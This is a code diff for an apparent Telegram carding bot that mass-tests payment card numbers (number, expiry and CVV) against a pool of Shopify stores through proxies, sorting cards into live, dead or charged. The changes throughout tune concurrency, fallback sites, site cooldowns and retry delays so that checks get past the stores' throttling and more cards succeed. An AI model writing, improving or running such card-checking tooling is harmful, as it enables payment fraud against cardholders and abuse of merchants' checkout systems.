@@ -64,11 +64,16 @@ EXTRA_CHARGED_GROUP_IDS = [-5447284969]
 BUTTON_LOCK_SECONDS = 30
 
 # ═══ OUTER RETRY CONFIG ═══
-MAX_OUTER_ROUNDS = int(os.environ.get("MAX_OUTER_ROUNDS", 3))
+# FIX #8: bumped from 3 rounds to 4 and delays from [30, 90, 180] to
+# [90, 180, 300, 300]. API host cooldowns are 30s and BLACKLIST is 15s;
+# short delays meant all retries fired DURING cooldown, guaranteeing
+# universal failure. Now retries outlast the cooldowns.
+MAX_OUTER_ROUNDS = int(os.environ.get("MAX_OUTER_ROUNDS", 4))
 OUTER_RETRY_DELAYS = [
-    int(os.environ.get("RETRY_DELAY_1", 30)),
-    int(os.environ.get("RETRY_DELAY_2", 90)),
-    int(os.environ.get("RETRY_DELAY_3", 180)),
+    int(os.environ.get("RETRY_DELAY_1", 90)),
+    int(os.environ.get("RETRY_DELAY_2", 180)),
+    int(os.environ.get("RETRY_DELAY_3", 300)),
+    int(os.environ.get("RETRY_DELAY_4", 300)),
 ]
 
 # ═══ PER-CARD RETRY BUDGETS ═══
@@ -76,10 +81,34 @@ MAX_PROXY_RETRIES = 5
 MAX_SITE_RETRIES  = 15
 
 # ═══ PER-CARD CONCURRENCY ═══
-CARD_CONCURRENCY = 1000
+# FIX #9: was 1000. At that rate, 1000 concurrent cards × fallback to 99
+# sites = 99,000 concurrent site attempts per second → instant self-throttle
+# on every site → mass SITES_EXHAUSTED. 50 is a sustainable ceiling that
+# lets sites actually process each request fully.
+CARD_CONCURRENCY = 50
+
+# FIX #3: cap fallback sites sent to the API. Passing all ~99 sites
+# amplified API fan-out by 99× per card. 5 is a reasonable hedge — API's
+# own hard-dead cache and blacklist will skip known-bad sites, so 5 random
+# picks per card is plenty of diversity without blasting the pool.
+MAX_FALLBACKS = 5
+
+# FIX #1: session-level site cooldown. Sites that return SITE_ERROR /
+# SKIP_SITE_CODES go into a TTL window instead of permanent blacklist.
+# Must be shorter than the API's HOST_COOLDOWN_SEC (30s) + BLACKLIST_SECONDS
+# (15s) so we re-try recovered sites within one card's lifecycle.
+SITE_COOLDOWN_TTL = 90
+
+# FIX #2: how many inner retries before deferring SITES_EXHAUSTED to the
+# outer retry round. 1 = one quick attempt, then let outer handle it.
+POOL_EXHAUSTED_MAX_INNER = 1
+POOL_EXHAUSTED_INNER_DELAY = 10.0
 
 # ═══ API CALL TIMING ═══
-API_ATTEMPTS = 3
+# FIX #3 (side effect): in single-site mode the API ignores `attempts`,
+# so 1 is safe and prevents any client-side cascade. HTTP retries are
+# still handled via max_retries=3 in check_shopify_card.
+API_ATTEMPTS = 1
 API_TIMEOUT = 25.0
 
 # ═══ STRUCTURED CODE CLASSIFICATIONS ═══
@@ -135,6 +164,29 @@ def _get_msh_http_session():
     return _MSH_HTTP_SESSION
 
 _MSH_SESSION_MAX_AGE = 3600
+
+
+# ═══════════════════════════════════════════════════════════════
+# FIX #1: time-based session site cooldowns
+# ═══════════════════════════════════════════════════════════════
+def _site_available(site: str, session: dict) -> bool:
+    """Return True if site is NOT in a cooldown window."""
+    now = time.time()
+    bl = session.get('_blacklisted_sites') or {}
+    np = session.get('_no_product_sites') or {}
+    return bl.get(site, 0) <= now and np.get(site, 0) <= now
+
+
+def _cleanup_site_cooldowns(session: dict) -> None:
+    """Prune expired entries from the time-based cooldown dicts."""
+    now = time.time()
+    session['_blacklisted_sites'] = {
+        k: v for k, v in (session.get('_blacklisted_sites') or {}).items() if v > now
+    }
+    session['_no_product_sites'] = {
+        k: v for k, v in (session.get('_no_product_sites') or {}).items() if v > now
+    }
+
 
 def _cleanup_msh_sessions():
     import time as _t
@@ -667,7 +719,7 @@ def is_expired(mm: str, yy: str) -> bool:
 
 
 # ═══════════════════════════════════════════════════════════════
-# SITE POOL — Fix 1: dedupe on every load
+# SITE POOL
 # ═══════════════════════════════════════════════════════════════
 
 _sites_cache = {"sites": [], "loaded_at": 0.0}
@@ -688,7 +740,6 @@ def get_sites():
         from database import get_global_sites
         sites = get_global_sites() or []
         if sites:
-            # ─── Fix 1: dedupe (was causing nxp9rb-pm to be hit 363 times) ───
             sites = list(dict.fromkeys(sites))
             _sites_cache = {"sites": sites, "loaded_at": now}
             logging.info(f"[MSH] Loaded {len(sites)} unique sites from MongoDB")
@@ -723,7 +774,6 @@ def get_sites():
             logging.error(f"[MSH] Error reading banned_sites.json: {e}")
 
     if sites:
-        # ─── Fix 1: dedupe ───
         sites = list(dict.fromkeys(sites))
         _sites_cache = {"sites": sites, "loaded_at": now}
         logging.warning(f"[MSH] Using sites.txt fallback ({len(sites)} unique sites)")
@@ -1203,6 +1253,8 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
     proxy_fails      = 0
     site_fails       = 0
     no_product_hits  = 0
+    # FIX #2: track how many times we've hit SITES_EXHAUSTED for this card
+    pool_exhausted_hits = 0
 
     parts = cc_formatted.split('|')
     cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
@@ -1245,24 +1297,46 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         if is_session_stopped(session_id):
             return
 
-        blacklisted = GLOBAL_BLACKLISTED_SITES | session.get('_blacklisted_sites', set())
-        no_products = session.get('_no_product_sites', set())
-        available = [s for s in sites_list if s not in blacklisted and s not in no_products]
+        # FIX #1: time-based availability — expired cooldowns re-enter pool
+        # periodically cleanup the dicts to avoid unbounded growth
+        if session['checked'] % 100 == 0:
+            _cleanup_site_cooldowns(session)
+
+        available = [
+            s for s in sites_list
+            if s not in GLOBAL_BLACKLISTED_SITES and _site_available(s, session)
+        ]
 
         if not available:
-            non_np = [s for s in sites_list if s not in no_products]
-            if not non_np:
-                result_status = "SKIPPED"
-                response_msg = "No sites with products available"
-                break
-            available = non_np
+            # All sites temporarily in cooldown. Yield briefly and recheck.
+            _cleanup_site_cooldowns(session)
+            await asyncio.sleep(2.0)
+            available = [
+                s for s in sites_list
+                if s not in GLOBAL_BLACKLISTED_SITES and _site_available(s, session)
+            ]
+            if not available:
+                # Last resort — ignore cooldowns entirely (better than losing
+                # the card). API will return THROTTLED or SITES_EXHAUSTED and
+                # our handler below will decide.
+                available = [s for s in sites_list if s not in GLOBAL_BLACKLISTED_SITES]
+                if not available:
+                    result_status = "SKIPPED"
+                    response_msg = "All sites permanently blacklisted"
+                    break
+
         site = random.choice(available)
         used_site = site
+
+        # FIX #3: cap fallback sites to MAX_FALLBACKS (was full remaining pool)
+        pool_minus = [s for s in available if s != site]
+        random.shuffle(pool_minus)
+        fallback_sites = pool_minus[:MAX_FALLBACKS]
 
         try:
             success, message, url, gateway, price, currency, proxy_status_raw, http_status = await process_card_api(
                 cc=cc, mes=mm, ano=yy, cvv=cvv, site=site, proxy=proxy,
-                fallback_sites=[s for s in available if s != site],
+                fallback_sites=fallback_sites,
             )
         except asyncio.CancelledError:
             raise
@@ -1290,18 +1364,40 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
 
         code = _extract_code(message)
 
-        # Terminal: SITES_EXHAUSTED — API already tried its batch, retrying doesn't help
+        # FIX #2: SITES_EXHAUSTED is TRANSIENT, not terminal.
+        # API returns this when its whole site pool is in cooldown —
+        # which recovers within 30-45s. One quick inner retry, then
+        # defer to the outer round (which waits 90s+).
         if code in POOL_EXHAUSTED_CODES:
-            logging.info(f"[MSH] API pool exhausted for {cc_formatted} (terminal)")
+            if pool_exhausted_hits < POOL_EXHAUSTED_MAX_INNER:
+                pool_exhausted_hits += 1
+                _cleanup_site_cooldowns(session)
+                logging.info(
+                    f"[MSH] Pool exhausted for {cc_formatted} "
+                    f"({pool_exhausted_hits}/{POOL_EXHAUSTED_MAX_INNER}) "
+                    f"— retrying in {POOL_EXHAUSTED_INNER_DELAY}s"
+                )
+                await asyncio.sleep(POOL_EXHAUSTED_INNER_DELAY)
+                continue
+            logging.info(
+                f"[MSH] Pool exhausted for {cc_formatted} after "
+                f"{POOL_EXHAUSTED_MAX_INNER} inner retries — deferring to outer round"
+            )
             result_status = "ERROR"
             response_msg = f"Sites exhausted: {message[:100]}"
             break
 
-        # No products / login / etc — try another site, no budget consumed
+        # FIX #1: TTL cooldown instead of permanent blacklist
         if code in SKIP_SITE_CODES:
-            session.setdefault('_no_product_sites', set()).add(site)
+            session.setdefault('_no_product_sites', {})[site] = (
+                time.time() + SITE_COOLDOWN_TTL
+            )
             no_product_hits += 1
-            logging.info(f"[MSH] Site {site} rejected ({code}) — trying another ({no_product_hits}/{len(sites_list)})")
+            logging.info(
+                f"[MSH] Site {site} rejected ({code}) — "
+                f"cooling down {SITE_COOLDOWN_TTL}s "
+                f"({no_product_hits}/{len(sites_list)})"
+            )
             await asyncio.sleep(0.05)
             continue
 
@@ -1312,11 +1408,17 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             await asyncio.sleep(0.1)
             continue
 
-        # Site error — try another site
+        # FIX #1: TTL cooldown instead of permanent blacklist
         if code in SITE_ERROR_CODES:
             site_fails += 1
-            session.setdefault('_blacklisted_sites', set()).add(site)
-            logging.info(f"[MSH] Site error for {cc_formatted} on {site} — trying another ({site_fails}/{MAX_SITE_RETRIES}): {message[:60]}")
+            session.setdefault('_blacklisted_sites', {})[site] = (
+                time.time() + SITE_COOLDOWN_TTL
+            )
+            logging.info(
+                f"[MSH] Site error for {cc_formatted} on {site} — "
+                f"cooling down {SITE_COOLDOWN_TTL}s "
+                f"({site_fails}/{MAX_SITE_RETRIES}): {message[:60]}"
+            )
             await asyncio.sleep(0.05)
             continue
 
@@ -1351,7 +1453,9 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             fake_charged = sum(1 for r in fake_results if r is True)
 
             if fake_charged >= 1:
-                session.setdefault('_blacklisted_sites', set()).add(site)
+                session.setdefault('_blacklisted_sites', {})[site] = (
+                    time.time() + SITE_COOLDOWN_TTL
+                )
                 GLOBAL_BLACKLISTED_SITES.add(site)
                 _save_to_blacklist(site)
                 print(f"\033[91m[ALERT] FAKE CHARGED on {site} ({fake_charged}/4)\033[0m")
@@ -1467,7 +1571,11 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         await asyncio.to_thread(update_user_stats, user_id, False)
 
     elif result_status == "SKIPPED":
-        logging.info(f"[MSH] Skipped {cc_formatted} — {response_msg}")
+        # FIX #1: count SKIPPED as errors so the outer round retries them
+        # (previously they were silently dropped from the report)
+        session['errors'] += 1
+        session['error_cards'].append(card_result_data)
+        logging.info(f"[MSH] Skipped→counted as error for outer retry: {cc_formatted}")
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -1687,7 +1795,6 @@ async def prunedead_command(message: types.Message):
         parse_mode="HTML",
     )
 
-    # 1. Fetch /dead-sites from every API replica
     dead_hosts: set = set()
     replica_reports: list = []
 
@@ -1727,7 +1834,6 @@ async def prunedead_command(message: types.Message):
         parse_mode="HTML",
     )
 
-    # 2. Delete from MongoDB global_sites
     deleted_from_db = 0
     try:
         def _delete_from_mongo():
@@ -1747,7 +1853,6 @@ async def prunedead_command(message: types.Message):
     except Exception as e:
         logging.error(f"[prunedead] Mongo delete failed: {e}")
 
-    # 3. Strip from sites.txt if it exists
     deleted_from_txt = 0
     try:
         sites_file = os.path.join(os.path.dirname(__file__), "sites.txt")
@@ -1770,7 +1875,6 @@ async def prunedead_command(message: types.Message):
     except Exception as e:
         logging.error(f"[prunedead] sites.txt prune failed: {e}")
 
-    # 4. Clear the API caches so the next run uses the fresh pool
     cache_cleared = 0
     async with aiohttp.ClientSession(
         timeout=aiohttp.ClientTimeout(total=10)
@@ -1784,7 +1888,6 @@ async def prunedead_command(message: types.Message):
                 except Exception:
                     pass
 
-    # 5. Report
     lines = [
         "<tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji> "
         "<b>𝗣𝗿𝘂𝗻𝗲 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲</b>",
@@ -1940,8 +2043,9 @@ async def process_mass_check_background(message: types.Message, bot: Bot, valid_
         "live_cards": [], "dead_cards": [], "charged_cards": [], "error_cards": [],
         "user_obj": user_obj, "plan_name": plan_name, "is_group": is_group,
         "retry_checked": 0, "retry_total": 0, "current_round": 0,
-        "_blacklisted_sites": set(),
-        "_no_product_sites": set(),
+        # FIX #1: time-based dicts — host -> cooldown_until timestamp
+        "_blacklisted_sites": {},
+        "_no_product_sites": {},
     }
     user_custom_sites = await asyncio.to_thread(get_user_sites_db, user_id)
     active_sites = user_custom_sites if user_custom_sites else get_sites()
@@ -2028,14 +2132,16 @@ async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
         if not retryable:
             logging.info(f"[MSH] Round {round_num}: no retryable errors — stopping")
             break
-        pool_size = 0
-        try:
-            from database import get_global_sites
-            pool_size = len(get_global_sites() or [])
-        except Exception:
-            pass
-        delay = 5 if pool_size >= 100 else OUTER_RETRY_DELAYS[min(round_num - 1, len(OUTER_RETRY_DELAYS) - 1)]
-        logging.info(f"[MSH] Round {round_num}: {len(retryable)} retryable, {len(finals)} final rejects, waiting {delay}s")
+        # FIX #8: always use the configured delays — was overridden to 5s
+        # when pool_size >= 100, guaranteeing all retries fired during the
+        # API's 30s host cooldown and failed identically.
+        delay = OUTER_RETRY_DELAYS[
+            min(round_num - 1, len(OUTER_RETRY_DELAYS) - 1)
+        ]
+        logging.info(
+            f"[MSH] Round {round_num}: {len(retryable)} retryable, "
+            f"{len(finals)} final rejects, waiting {delay}s"
+        )
         await _update_retry_banner(bot, session_id, round_num, len(retryable), delay, phase="waiting")
         for _ in range(delay):
             if is_session_stopped(session_id):
